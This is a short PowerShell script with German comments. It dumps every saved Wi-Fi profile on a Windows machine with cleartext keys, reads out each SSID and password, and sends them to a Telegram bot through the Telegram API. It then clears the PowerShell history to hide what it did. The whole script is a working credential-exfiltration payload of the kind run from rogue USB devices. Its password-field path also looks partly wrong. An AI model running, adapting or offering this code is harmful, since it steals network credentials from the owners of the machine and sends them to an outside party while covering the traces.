# Export-Verzeichnis
$exportDir = "$env:temp\SomeStuff"

# Sicherstellen, dass das Exportverzeichnis existiert
if (-not (Test-Path $exportDir)) {
    try {
        New-Item -ItemType Directory -Path $exportDir -Force
    } catch {
        Write-Host "Fehler beim Erstellen des Exportverzeichnisses: $_"
        return
    }
}

# WLAN-Profile exportieren (inkl. Schlüssel)
try {
    netsh wlan export profile key=clear folder=$exportDir
} catch {
    Write-Host "Fehler beim Exportieren der WLAN-Profile: $_"
    return
}

# Alle exportierten XML-Dateien lesen
$xmlFiles = Get-ChildItem -Path $exportDir -Filter "*.xml"
if ($xmlFiles.Count -eq 0) {
    Write-Host "Keine exportierten WLAN-Profile gefunden."
    return
}

# Webhook-Anfrage mit Datei-Upload
foreach ($xmlFile in $xmlFiles) {
    $xml = [xml](Get-Content -Path $xmlFile.FullName)
    $ssid = $xml.WLANProfile.SSIDConfig.SSID.name
    $password = $xml.WLANProfile.MSPEAPSettings.SecurityPassword.Password

    # Bereite die Daten vor
    $message = "SSID: $ssid`nPassword: $password"
    $encodedMessage = [Uri]::EscapeDataString($message)
    $uri = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$encodedMessage"

    try {
        # Senden Sie die Anfrage
        $response = Invoke-RestMethod -Uri $uri -Method Get
        if ($response.ok) {
            Write-Host "Erfolgreich an den Telegram-Bot gesendet: $($xmlFile.Name)"
        } else {
            Write-Host "Fehler beim Senden an den Telegram-Bot: $($response.description)"
        }
    } catch {
        Write-Host "Fehler beim Senden an den Telegram-Bot: $_"
    }
}

Clear-History
